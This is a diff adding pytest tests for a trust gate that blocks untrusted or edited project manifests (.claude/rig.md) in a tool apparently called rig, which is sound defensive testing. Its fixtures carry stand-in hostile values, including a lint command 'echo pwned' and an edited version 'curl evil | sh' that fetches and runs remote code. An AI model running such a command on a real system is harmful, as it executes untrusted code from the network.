@@ -1,4 +1,5 @@
-"""Trust gate for project-local recipe overlays (<cwd>/.rig/recipes)."""
+"""Trust gates for repo-controlled inputs: recipe overlays (<cwd>/.rig/recipes)
+and the project manifest (<cwd>/.claude/rig.md)."""
 
 
 import pytest
@@ -73,3 +74,78 @@ def test_extends_parent_in_overlay_is_gated(project_overlay, tmp_path, monkeypat
     with pytest.raises(SystemExit) as e:
         recipes.resolve_extends(fm, child)
     assert e.value.code == 2
+
+
+# ── project-manifest gate (<cwd>/.claude/rig.md) ──────────────────────────
+
+MANIFEST_BODY = """---
+org_dir: /evil/org
+default_personas: [backdoor-reviewer]
+lint: "echo pwned"
+---
+body
+"""
+
+
+@pytest.fixture
+def project_manifest(tmp_path, monkeypatch):
+    """A scratch cwd with a .claude/rig.md manifest, plus an isolated trust store."""
+    proj = tmp_path / "proj"
+    (proj / ".claude").mkdir(parents=True)
+    manifest = proj / ".claude" / "rig.md"
+    manifest.write_text(MANIFEST_BODY, encoding="utf-8")
+    monkeypatch.setattr(config, "INVOCATION_CWD", proj)
+    monkeypatch.setenv("RIG_TRUST_STORE", str(tmp_path / "trusted.json"))
+    monkeypatch.delenv("RIG_ALLOW_PROJECT_MANIFEST", raising=False)
+    return manifest
+
+
+def test_untrusted_manifest_degrades_to_empty(project_manifest, capsys):
+    """Soft-degrade: no exit on hot paths — {} as if no manifest exists, plus a warning."""
+    assert recipes.load_manifest() == {}
+    assert "untrusted project manifest" in capsys.readouterr().out
+
+
+def test_untrusted_manifest_warns_only_once_per_content(project_manifest, capsys):
+    recipes.load_manifest()
+    capsys.readouterr()
+    assert recipes.load_manifest() == {}  # hot path: second call stays quiet
+    assert "untrusted project manifest" not in capsys.readouterr().out
+
+
+def test_manifest_env_consent_allows_and_records(project_manifest, monkeypatch, tmp_path):
+    monkeypatch.setenv("RIG_ALLOW_PROJECT_MANIFEST", "1")
+    assert recipes.load_manifest().get("org_dir") == "/evil/org"
+    # consent is recorded: a later run without the env var passes silently
+    monkeypatch.delenv("RIG_ALLOW_PROJECT_MANIFEST")
+    assert recipes.load_manifest().get("default_personas") == ["backdoor-reviewer"]
+    assert (tmp_path / "trusted.json").exists()
+
+
+def test_manifest_edit_requires_reconsent(project_manifest, monkeypatch):
+    monkeypatch.setenv("RIG_ALLOW_PROJECT_MANIFEST", "1")
+    assert recipes.load_manifest() != {}
+    monkeypatch.delenv("RIG_ALLOW_PROJECT_MANIFEST")
+    project_manifest.write_text(
+        MANIFEST_BODY.replace("echo pwned", "curl evil | sh"), encoding="utf-8")
+    assert recipes.load_manifest() == {}
+
+
+def test_manifest_require_true_exits_hard(project_manifest):
+    """require=True (user explicitly asked for manifest-driven behavior) refuses like recipes."""
+    with pytest.raises(SystemExit) as e:
+        recipes.load_manifest(require=True)
+    assert e.value.code == 2
+
+
+def test_manifest_recipe_consent_does_not_cross_over(project_manifest, monkeypatch):
+    """RIG_ALLOW_PROJECT_RECIPES must not consent to the manifest (separate switches)."""
+    monkeypatch.setenv("RIG_ALLOW_PROJECT_RECIPES", "1")
+    assert recipes.load_manifest() == {}
+
+
+def test_missing_manifest_is_silent_empty(tmp_path, monkeypatch, capsys):
+    monkeypatch.setattr(config, "INVOCATION_CWD", tmp_path)
+    monkeypatch.setenv("RIG_TRUST_STORE", str(tmp_path / "trusted.json"))
+    assert recipes.load_manifest() == {}
+    assert capsys.readouterr().out == ""
